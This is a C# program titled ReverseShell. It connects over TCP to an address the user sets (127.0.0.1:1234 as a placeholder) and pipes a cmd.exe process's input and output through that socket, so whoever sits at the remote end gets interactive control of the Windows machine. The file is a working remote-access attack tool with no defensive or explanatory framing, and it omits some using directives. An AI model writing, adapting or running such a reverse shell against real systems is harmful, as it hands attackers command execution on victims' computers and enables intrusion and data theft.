using System;
using System.Diagnostics;
using System.Net.Sockets;

namespace ReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            // Replace the IP address and port below with the ones that you want to connect to
            string ipAddress = "127.0.0.1";
            int port = 1234;

            // Create a TcpClient that will connect to the reverse shell
            TcpClient client = new TcpClient(ipAddress, port);

            // Create a Process that will run the command prompt
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";

            // Redirect the input, output, and error streams of the command prompt to the TcpClient
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();

            // Open the streams
            NetworkStream stream = client.GetStream();
            StreamWriter streamWriter = new StreamWriter(stream);
            StreamReader streamReader = new StreamReader(stream);

            // Start a background thread that will read the output of the command prompt and write it to the TcpClient
            var outputThread = new Thread(() =>
            {
                while (true)
                {
                    string output = p.StandardOutput.ReadLine();
                    streamWriter.WriteLine(output);
                    streamWriter.Flush();
                }
            });
            outputThread.Start();

            // Start a background thread that will read the input from the TcpClient and write it to the command prompt
            var inputThread = new Thread(() =>
            {
                while (true)
                {
                    string input = streamReader.ReadLine();
                    p.StandardInput.WriteLine(input);
                }
            });
            inputThread.Start();
        }
    }
}
